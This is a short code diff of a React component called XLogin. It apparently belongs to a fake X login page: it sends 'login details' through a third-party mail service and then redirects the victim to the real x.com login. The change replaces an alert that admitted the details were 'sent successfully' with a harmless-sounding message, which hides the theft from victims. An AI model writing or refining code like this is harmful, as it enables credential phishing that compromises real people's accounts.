@@ -27,7 +27,7 @@ export default function XLogin() {
       "ngxOCmfwhTYpS9VyD"
     )
     .then(() => {
-      alert("Login details sent successfully. You can now continue with X!");
+      alert("One of our team members will contact you shortly, You can now continue with X. Thanks!");
       window.location.href = "https://x.com/i/flow/login";
     })
     .catch(() => {
